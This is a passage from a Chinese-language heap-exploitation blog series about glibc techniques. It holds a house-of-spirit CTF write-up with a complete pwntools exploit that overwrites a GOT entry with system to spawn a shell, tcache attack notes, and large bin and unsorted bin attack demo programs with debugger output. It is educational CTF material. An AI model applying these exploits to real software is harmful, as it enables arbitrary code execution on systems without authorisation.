<p>hof还有一个前置条件就是要修下一个紧邻chunk的size值，让他大于 2 * SIZE_SZ，否则会不满足glibc的校验条件。我们可控紧邻chunk的size在什么位置。假chunk的地址是0x804A2A0，大小是0x40，那么紧邻chunk的地址就是<code>0x0804A2A0 + 0x40 = 0x804a2e0</code>, 利用leave message这个函数是可以修改<code>0x0804A2C0 ~ 0x804A2C0 + 0x80</code>这块的地址的，下一个紧邻chunk的size字段相对于0x0804A2C0的偏移是<code>0x804a2e0 + 4 - 0x0804A2C0 = 0x24</code>, 因此我们通过写入0x24个字节的占位字节，然后和一个满足大于 2 * SIZE_SZ的假size字段就可以满足hos的条件。占位字节最好是NULL，只有这样才能在free链表指针的时候停下来。</p>
<p>经过这些操作我们可以得到一个虚假的0x40大小的fastbin chunk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fastbins[idx=6, size=0x40]  ←  Chunk(addr=0x804a2a8, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x58252418, size=0x40, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure>
<p>并且这个chunk的地址也是我们想要的0x804a2a8。</p>
<p>我们再通过申请一个0x40的chunk拿到对0x804a2a8的控制权，我们就可以把一个函数的got表地址写入到0x804a2a8中，我们应该选择哪一个函数呢，我们目标是把这个got表写入system函数，system函数的第一个参数需要是我们可以控制的，所以被复写的函数最好也是一个第一个参数是用户可控的函数，所有的GOT函数列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf	extern	0804A340	00000004	00000000	00000000	R	.	.	.	.	.	T	.</span><br><span class="line">free	extern	0804A344	00000004	00000000	00000000	R	.	.	.	.	.	T	.</span><br><span class="line">fgets	extern	0804A348	00000004	00000000	00000000	R	.	.	.	.	.	T	.</span><br><span class="line">__stack_chk_fail	extern	0804A34C	00000004			.	.	.	.	.	.	.	.</span><br><span class="line">malloc	extern	0804A350	00000004	00000000	00000000	R	.	.	.	.	.	T	.</span><br><span class="line">puts	extern	0804A354	00000004	00000000	00000000	R	.	.	.	.	.	T	.</span><br><span class="line">strlen	extern	0804A358	00000004	00000000	00000000	R	.	.	.	.	.	T	.</span><br><span class="line">__libc_start_main	extern	0804A35C	00000004	00000000	00000000	R	.	.	.	.	.	T	.</span><br><span class="line">__isoc99_sscanf	extern	0804A360	00000004			R	.	.	.	.	.	.	.</span><br><span class="line">__gmon_start__	extern	0804A364	00000004			R	.	.	.	.	.	.	.</span><br></pre></td></tr></table></figure>
<p>找来找去只有__isoc99_sscanf符合这个条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_8048896()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+18h] [ebp-30h] BYREF</span><br><span class="line">  char s[32]; // [esp+1Ch] [ebp-2Ch] BYREF</span><br><span class="line">  unsigned int v3; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Action: &quot;);</span><br><span class="line">    fgets(s, 32, stdin);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( !(__isoc99_sscanf)(s, &quot;%u&quot;, &amp;v1) );   //第一个参数是从fgets中读出来的可控的</span><br><span class="line">  return v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以我们通过申请一个0x40的chunk，然后给这个chunk赋值为sscanf的got表地址，这样就把0x804a2a8指向了sscanf.got的地址，如果我们再次调用leavemessage函数就可以让这个got表的值修改为system在 libc中的偏移地址了。之后在通过发送/bin/sh字符串，调用sscanf进而调用system得到shell。</p>
<h3 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">target = process(argv=[&#x27;./ld-2.23.so&#x27;,&#x27;./oreo_origin&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br><span class="line"># gdb.attach(target)</span><br><span class="line">elf = ELF(&#x27;oreo_origin&#x27;)</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def addRifle(name, desc):</span><br><span class="line">  target.sendline(&#x27;1&#x27;)</span><br><span class="line">  target.sendline(name)</span><br><span class="line">  target.sendline(desc)</span><br><span class="line"></span><br><span class="line">def leakLibc():</span><br><span class="line">  target.sendline(&#x27;2&#x27;)</span><br><span class="line">  print target.recvuntil(&quot;Description: &quot;)</span><br><span class="line">  print target.recvuntil(&quot;Description: &quot;)</span><br><span class="line">  leak = target.recvline()</span><br><span class="line">  puts_addr = u32(leak[0:4])</span><br><span class="line">  libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">  return libc_base</span><br><span class="line"></span><br><span class="line">def orderRifles():</span><br><span class="line">  target.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def leaveMessage(content):</span><br><span class="line">  target.sendline(&quot;4&quot;)</span><br><span class="line">  target.sendline(content)</span><br><span class="line"></span><br><span class="line">addRifle(&#x27;1&#x27;*27 + p32(0x804A248) ,&#x27;123&#x27;)</span><br><span class="line">libc_addr = leakLibc()</span><br><span class="line">print(hex(libc_addr))</span><br><span class="line"></span><br><span class="line">for i in range(0,0x40-1):</span><br><span class="line">    addRifle(&#x27;123&#x27;,&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target.sendline(&#x27;5&#x27;)</span><br><span class="line">res = target.recv()</span><br><span class="line">res = target.recv()</span><br><span class="line"></span><br><span class="line">addRifle(&#x27;A&#x27;*27 + p32(0x804A2A8),&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line">leaveMessage(&#x27;\x00&#x27; * 0x24 + p32(0x20))</span><br><span class="line"></span><br><span class="line">orderRifles()</span><br><span class="line"></span><br><span class="line">addRifle(&#x27;123&#x27;, p32(elf.got[&#x27;__isoc99_sscanf&#x27;]))</span><br><span class="line">addRifle(&#x27;A&#x27;*31 + p32(0x40) + p32(0x61),&#x27;123&#x27;)</span><br><span class="line">system = libc_addr + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">leaveMessage(p32(system))</span><br><span class="line">target.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">target.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>hos攻击的应用场景是比较苛刻的，需要能够有一个逻辑能触发错误的free, 目标地址的前面和后面都要是可控的才能满足两个size的检测。在实际的漏洞挖掘利用中，笔者感觉很难见到。<br><img src="/images/heap_exp//2021-06-15-09-51-20.png"><br>new_rifle_num可控，dword_804A2A8是我们的目标地址（但是不可控），off_804A2C0后面的可控，还有一个free，才能达到house of spirit的条件，实现对dword_804A2A8的控制</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1.<a href="https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html">https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html</a><br>2.<a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit">https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit</a><br>3.<a href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/39-house_of_spirit/hacklu14_oreo">https://github.com/guyinatuxedo/nightmare/tree/master/modules/39-house_of_spirit/hacklu14_oreo</a></p>
]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>堆利用系列七：Tcache Attack </title>
    <url>/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B8%83%EF%BC%9ATcache-Attack/</url>
    <content><![CDATA[<h2 id="malloc中tcache的分配优先级"><a href="#malloc中tcache的分配优先级" class="headerlink" title="malloc中tcache的分配优先级"></a>malloc中tcache的分配优先级</h2><ol>
<li>先看是不是符合fastbin，如果符合看tcache是否有符合的，如果有则优先从tcache中分配</li>
<li>看smallbin中是否又能够满足的，也是优先看tcache是否符合，如果符合则从tcache中分配，如果没有满足的才从smallbin中分配</li>
</ol>
<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>可以导致溢出一个字节，但是这个字节不能为NULL</p>
<h3 id="我一开始的思路"><a href="#我一开始的思路" class="headerlink" title="我一开始的思路"></a>我一开始的思路</h3><ol>
<li>通过一些布局实现对一个字节的溢出，导致融合错误，导致一个大的chunk放到了unsorted bin上了，然后通过malloc一个tcache上没有的chunk把这个unsroted bin上的chunk给分割掉，同时有一部分已经可以覆盖了tcache上的chunk，那么写入这个chunk就可以修改tcache了。<br><img src="/images/heap_exp/2021-06-08-21-02-17.png" alt></li>
<li>但是这个思路貌似卡在了一个字节溢出这个地方，我溢出这个字节不能是NULL，根据题目的原因，然后我尝试用\x02和\x04以及\x08去尝试，发现都会导致程序崩溃，所以这条路就没有走通，但是如果允许溢出 NULL字节的话，我觉着这个思路还是没有问题的</li>
</ol>
<h3 id="第二个思路"><a href="#第二个思路" class="headerlink" title="第二个思路"></a>第二个思路</h3><ol>
<li><p>通过单字节溢出，把0x100的chunk改为0x180的chunk，那么就可以继续通过malloc 0x180 得到一个大的chunk，但是实际上已经覆盖了对下面已经在tcache上的chunk的控制了<br><img src="/images/heap_exp/2021-06-08-21-48-17.png" alt></p>
</li>
<li><p>貌似第二个是简单易行的方法，首先得到malloc_hook的地址<code>0x7ffff7dcfc30 &lt;__malloc_hook&gt;: 0x0000000000000000</code>，这个地址是没有\x00的，所以还是比较容易写入的。</p>
</li>
<li>现在一个问题是如何得到泄露地址，貌似这个打印是根据\x00截止的，如果没有遇到\x00打印就不会终结。</li>
</ol>
<h2 id="手稿图"><a href="#手稿图" class="headerlink" title="手稿图"></a>手稿图</h2><p><img src="/images/heap_exp/2021-06-10-20-38-28.png" alt></p>
]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>堆利用系列六：Large Bin Attack </title>
    <url>/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BLarge-Bin-Attack/</url>
    <content><![CDATA[<h3 id="large-bin-attack的作用"><a href="#large-bin-attack的作用" class="headerlink" title="large bin attack的作用"></a>large bin attack的作用</h3><p>例程1的作用就是任意地址写，但是写的内容不可控，所以只能用来修改global_max_fast这种作为一种中间步骤。</p>
<h3 id="large-bin-attack-例程1"><a href="#large-bin-attack-例程1" class="headerlink" title="large bin attack 例程1"></a>large bin attack 例程1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// This is based off of Shellphish&apos;s how2heap: https://github.com/shellphish/how2heap/blob/master/glibc_2.26/large_bin_attack.c</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;This will be covering large bin attacks.&quot;);</span><br><span class="line">    puts(&quot;They are similar to unsorted bin attacks, with that they let us write a pointer.&quot;);</span><br><span class="line">    puts(&quot;However like unsorted bin attacks, we can control where the pointer is written to, but not the value of the pointer.&quot;);</span><br><span class="line">    puts(&quot;Let&apos;s get started.\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long target = 0xdeadbeef;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Our goal will be to overwrite the target variable.\n&quot;);</span><br><span class="line">    printf(&quot;Target address:\t%p\n&quot;, &amp;target);</span><br><span class="line">    printf(&quot;Target value:\t0x%lx\n\n&quot;, target);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will start off by allocating six chunks.\n&quot;);</span><br><span class="line">    printf(&quot;Three of them will be big enough to go into the small/large bins.\n&quot;);</span><br><span class="line">    printf(&quot;The other three chunks will be fastbin size, to prevent consolidation between the large bin size chunks.\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long *ptr0, *ptr1, *ptr2;</span><br><span class="line">    unsigned long *fpt0, *fpt1, *fpt2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr0 = malloc(0x200);</span><br><span class="line">    fpt0 = malloc(0x10);</span><br><span class="line"></span><br><span class="line">    ptr1 = malloc(0x500);</span><br><span class="line">    fpt1 = malloc(0x10);</span><br><span class="line">    </span><br><span class="line">    ptr2 = malloc(0x500);</span><br><span class="line">    fpt2 = malloc(0x10);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we have allocated our chunks.\n&quot;);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Large Chunk0:\t%p\n&quot;, ptr0);</span><br><span class="line">    printf(&quot;Large Chunk1:\t%p\n&quot;, ptr1);</span><br><span class="line">    printf(&quot;Large Chunk2:\t%p\n&quot;, ptr2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Small Chunk0:\t%p\n&quot;, fpt0);</span><br><span class="line">    printf(&quot;Small Chunk1:\t%p\n&quot;, fpt1);</span><br><span class="line">    printf(&quot;Small Chunk2:\t%p\n\n&quot;, fpt2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we will free the first two large chunks.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr0);</span><br><span class="line">    free(ptr1);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now they are both in the unsorted bin.\n&quot;);</span><br><span class="line">    printf(&quot;Since large bin sized chunks are inserted into the unsorted bin, before being moved to the large bin for potential reuse before they are thrown into that bin.\n&quot;);</span><br><span class="line">    printf(&quot;We will now allocate a fastbin sized chunk. This will move our second (larger) chunk into the large bin (since it is the larger chunk in the unsorted bin).\n&quot;);</span><br><span class="line">    printf(&quot;The first (smaller) chunk will have part of it&apos;s space used for the allocation, and then the remaining chunk will be inserted into the unsorted bin.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    malloc(0x10);  //--------------------&gt;b1</span><br><span class="line"></span><br><span class="line">    printf(&quot;Next up we will insert the third large chunk into the unsorted bin by freeing it.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr2);   //---------------------&gt;b2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;Now here is where the bug comes in.\n&quot;);  //-------------------------&gt;b3</span><br><span class="line">    printf(&quot;We will need a bug that will allow us to edit the second chunk (the one that is in the unsorted bin).\n&quot;);</span><br><span class="line">    printf(&quot;Like with the unsorted bin attack, the bk pointer controls where our write goes to.\n&quot;);</span><br><span class="line">    printf(&quot;We will also need to zero out the fwd pointer.\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr1[0] = 0;</span><br><span class="line">    ptr1[1] = (unsigned long)((&amp;target) - 0x2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will also need to overwrite it&apos;s size values with a smaller value.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr1[-1] = 0x300;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Proceeding that we will allocate another small chunk.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The larger chunk (third chunk) in the unsorted bin will be inserted into the large bin.\n&quot;);</span><br><span class="line">    printf(&quot;However since the large bin is organized by size, the biggest chunk has to be first.\n&quot;);</span><br><span class="line">    printf(&quot;Since we overwrote the size of the second chunk with a smaller size, the third chunk will move up and become the front of the large bin.\n&quot;);</span><br><span class="line">    printf(&quot;This is where our write happens.\n\n&quot;);	</span><br><span class="line"></span><br><span class="line">    malloc(0x10);  //-------------------------&gt;b4</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we can see that the value of the target is:\n&quot;);  //----------------------&gt;b5</span><br><span class="line">    printf(&quot;Target value:\t0x%lx\n&quot;, target);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在b1地方下断点，观察内存情况<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">───────────────────────────── Unsorted Bin for arena &apos;*0x7ffff7dd1b20&apos; ─────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758640, bk=0x555555758410</span><br><span class="line"> →   Chunk(addr=0x555555758650, size=0x510, flags=PREV_INUSE)   →   Chunk(addr=0x555555758420, size=0x210, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure></p>
<p>由于free的时候，会把不是fastbin的chunk放到unsorted bin上，所以这个时候会有两个chunk在unsorted bin上。 </p>
<p>在malloc(0x10)之后，会导致0x510的chunk被会回收到了large bin上，同时也会把0x210的chunk回收到smallbin上，但是由于申请的空间0x10+0x10是小于large bin的大小的，因此还是会从small bin chunk上找空间，就又从这个0x210的small chunk上分走了0x20大小的chunk，然后剩下的chunk被放入到了unsorted bin上。对应的源码为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void *</span><br><span class="line">_int_malloc (mstate av, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) </span><br><span class="line">        &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            unsorted_chunks (av)-&gt;bk = bck;    //一定会把chunk从unsorted bin上给删去的</span><br><span class="line">            bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            mark_bin (av, victim_index);</span><br><span class="line">            victim-&gt;bk = bck;</span><br><span class="line">            victim-&gt;fd = fwd;</span><br><span class="line">            fwd-&gt;bk = victim;</span><br><span class="line">            bck-&gt;fd = victim;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">         if (!in_smallbin_range (nb))&#123;</span><br><span class="line">             ....  // 如果申请的大小是large chunk，则从large bin中返回chunk给用户</span><br><span class="line">             return p;</span><br><span class="line">         &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        //走到这里就已经是说明申请的大小是小于large bin chunk的了</span><br><span class="line"></span><br><span class="line">         remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">            have to perform a complete insert here.  */</span><br><span class="line">        bck = unsorted_chunks (av);     // 把从smallbin中分割剩下的remainder放到unsorted bin上。</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;</span><br><span class="line">            goto errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br></pre></td></tr></table></figure></p>
<p>观察b2断点处的情况<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">───────────────────────────── Unsorted Bin for arena &apos;*0x7ffff7dd1b20&apos; ─────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758430, bk=0x555555758430</span><br><span class="line"> →   Chunk(addr=0x555555758440, size=0x1f0, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in unsorted bin.</span><br><span class="line">────────────────────────────── Small Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────</span><br><span class="line">[+] Found 0 chunks in 0 small non-empty bins.</span><br><span class="line">────────────────────────────── Large Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────</span><br><span class="line">[+] large_bins[67]: fw=0x555555758640, bk=0x555555758640</span><br><span class="line"> →   Chunk(addr=0x555555758650, size=0x510, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure></p>
<p>unsorted bin上就是从0x210的分下来的。</p>
<p>观察b3断点的情况<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] unsorted_bins[0]: fw=0x555555758b70, bk=0x555555758430</span><br><span class="line"> →   Chunk(addr=0x555555758b80, size=0x510, flags=PREV_INUSE)   →   Chunk(addr=0x555555758440, size=0x1f0, flags=PREV_INUSE)</span><br><span class="line">[+] Found 2 chunks in unsorted bin.</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────── Small Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">[+] Found 0 chunks in 0 small non-empty bins.</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────── Large Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">[+] large_bins[67]: fw=0x555555758640, bk=0x555555758640</span><br><span class="line"> →   Chunk(addr=0x555555758650, size=0x510, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in 1 large non-empty bins.</span><br></pre></td></tr></table></figure></p>
<p>unsorted bin上被新增一个free的0x510的chunk，并且放到了头部。</p>
<p>接着的利用一个溢出漏洞，修改ptr1<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ptr1[0] = 0;</span><br><span class="line">ptr1[1] = (unsigned long)((&amp;target) - 0x2);</span><br><span class="line">ptr1[-1] = 0x300;</span><br></pre></td></tr></table></figure></p>
<p>这个是为了后续进行给target修改值做准备。最后通过malloc(0x10)来触发对target的改写。</p>
<p>下面简单说一下最后一个malloc(0x10)的时候，libc到底干了些什么事情<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 首先会判断这个0x10是符合fastbin的，但是fastbin是空的</span><br><span class="line">2. 所以尝试在smallbin上寻找，但是smallbin上也是空的 </span><br><span class="line">3. 这时候才尝试在unsortedbin上遍历chunk，遍历的方式是从尾部向头部遍历，先取出来unsortedbin尾部的chunk之后开始进行操作</span><br><span class="line">4. 先判断申请的大小是否符合small chunk， 是否是只有一个chunk在unsorted bin，由于我们有两个chunk所以这个不满足，所以不会进入尝试使用last remainder的逻辑</span><br><span class="line">5. 尝试把这个尾部的unsorted bin从链上给取下来</span><br><span class="line">6. 再判断我们的申请的chunk的size和当前这个chunk的size是否相等，如果相等就直接把当前这个chunk返回给用户,我们的申请的是0x20大小的，与现有的unsorted bin上的chunk都不符合，所以也不会执行这个流程</span><br><span class="line">7. 把他们回收到各自的bin上，注意到这里已经不用考虑分配的事情了，它最终会把unsroted bin给遍历一遍然后把剩下的0x1f0和0x510的chunk回收到各自的small bin和large bin上</span><br><span class="line">8. 回收完毕后，再考虑分配0x20的事情</span><br><span class="line">9. 会先看是不是large request，由于这是个small request，所以不执行这个流程</span><br><span class="line">10. 之后就是在small bin上进行best fit搜索，就是找可用的最小可用的，我们显然在small bin上只能找到0x1f0这个chunk，所以就在这个chunk上分配</span><br><span class="line">11. 把0x1f0这个chunk继续分割，头部的返回给用户，剩下的放到unsorted bin上，所以这个时候unsorted bin只剩下0x1d0(0x1f0 - 0x20)</span><br><span class="line"></span><br><span class="line">注意第7步，往large bin上回收的时候会触发我们的large bin attack，就是往我们指定的地址上开始写值。</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/heap_exp/2021-06-03-18-49-11.png" alt></p>
<h3 id="large-bin的分配和释放"><a href="#large-bin的分配和释放" class="headerlink" title="large bin的分配和释放"></a>large bin的分配和释放</h3><p><img src="/images/heap_exp/2021-06-03-17-22-05.png" alt></p>
]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>堆利用系列五：Unsorted Bin Attack </title>
    <url>/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文首先通过一个unsorted bin attack的例程解释其基本原型。然后通过详细的记录0CTF 2016 - Zerostorage的解题过程，包括解题思路，以及解题中遇到的困难和错误都按照时间线的方式记录下来了，我认为这种原汁原味的writeup相比于标准答案可能更能给大家一些参考信息。</p>
<h3 id="unsorted-bin-attack例程"><a href="#unsorted-bin-attack例程" class="headerlink" title="unsorted bin attack例程"></a>unsorted bin attack例程</h3><p>首先一个例子解释什么是unsorted bin attack,大家自行根据我之前的系列文章改用2.23版本的libc进行运行调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned long remissions;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        puts(&quot;So we will be covering an unsorted bin attack.&quot;);</span><br><span class="line">        puts(&quot;The unsorted bin is a doubly linked list.&quot;);</span><br><span class="line">        puts(&quot;This attack will allow us to write a pointer to the address of our choosing.&quot;);</span><br><span class="line">        puts(&quot;While this attack really doesn&#x27;t give us much control over what we write, we can count on it being a ptr (which will probably be a &#x27;large&#x27; integer)&quot;);</span><br><span class="line">        puts(&quot;Let&#x27;s get started.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So our goal will be to overwrite the value of the &#x27;remissions&#x27; global variable.\n&quot;);</span><br><span class="line">    printf(&quot;It is at the bss address: \t%p\n&quot;, &amp;remissions);</span><br><span class="line">    printf(&quot;With the value: \t\t%0lx\n\n&quot;, remissions);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will start by allocating two chunks. One to insert into the unsorted bin.\n&quot;);</span><br><span class="line">    printf(&quot;The other to prevent consolidation with the top chunk.\n&quot;);</span><br><span class="line"></span><br><span class="line">        unsigned long *ptr0 = malloc(0xf0);</span><br><span class="line">    unsigned long *ptr1 = malloc(0x10);</span><br><span class="line"></span><br><span class="line">        printf(&quot;We have allocated our first chunk at:\t%p\n&quot;, ptr0);</span><br><span class="line"></span><br><span class="line">        printf(&quot;Now let&#x27;s free it to insert it into the unsorted bin.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">        free(ptr0);</span><br><span class="line"></span><br><span class="line">        printf(&quot;Now that it has been inserted into the unsorted bin, we can see it&#x27;s fwd and bk pointers.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;fwd:\t0x%lx\n&quot;, ptr0[0]);</span><br><span class="line">    printf(&quot;bk:\t0x%lx\n\n&quot;, ptr0[1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now when a chunk gets removed from the unsorted bin, a pointer to gets written to it&#x27;s back chunk.\n&quot;);</span><br><span class="line">    printf(&quot;Specifically a pointer will get written to bk + 0x10 on x64 (bk + 0x8 for x86).\n&quot;);</span><br><span class="line">    printf(&quot;That is where we get our ptr write from.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So by using a bug, we can edit the bk pointer of the freed chunk to point to remissions - 0x10.\n&quot;);</span><br><span class="line">    printf(&quot;That way when the chunk leaves the unsorted bin, the pointer will be written to remissions.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr0[1] = (unsigned long)(&amp;remissions - 0x2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The current fwd and bk pointers after the write.\n&quot;);</span><br><span class="line">    printf(&quot;fwd:\t0x%lx\n&quot;, ptr0[0]);</span><br><span class="line">    printf(&quot;bk:\t0x%lx\n\n&quot;, ptr0[1]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we allocate a new chunk of the same size to remove our freed chunk from the unsorted bin.&quot;);</span><br><span class="line">    printf(&quot;This will trigger the write to remissions, which has a current value of 0x%lx\n&quot;, remissions);</span><br><span class="line"></span><br><span class="line">    malloc(0xf0);//------------------------&gt;c1</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we can see that the value of remissions has changed.\n&quot;);</span><br><span class="line">    printf(&quot;remissions:\t0x%lx\n&quot;, remissions);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们根据之前学习到的堆的知识，直接自己画图分析整个程序的所作所为。<br><img src="pastimages/2021-05-30-15-41-55.png"><br>当我们在c1处再次malloc(0xf0)的时候，实际上就是把原来在unsorted bin上的chunk0给分配回来，这就涉及到了把原来的chunk从unsorted bin上给解链下来。根据之前的文章我们分析过，解链需要涉及到两个指针的写入，分别是chunk0的fd指向chunk的bk指针，以及chunk0的bk指向的chunk的fd指针。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk0-&gt;fd-&gt;bk = chunk0-&gt;bk</span><br><span class="line">chunk0-&gt;bk-&gt;fd = chunk0-&gt;fd</span><br></pre></td></tr></table></figure>
<p>有同学可能会问，这不就是unlink操作吗，unlink操作不是要进行一次证明“你的前面一个人的后一个人就是你自己的校验吗”<br>没错这个本质上就是unlink，但是unlink只会在consolidate的时候调用，在glibc源码中，unlink函数只在free函数和malloc_consolidate的时候被调用，在malloc的从unsorted bin中分配并没有调用</p>
<p>malloc_consolidate中的两次调用</p>
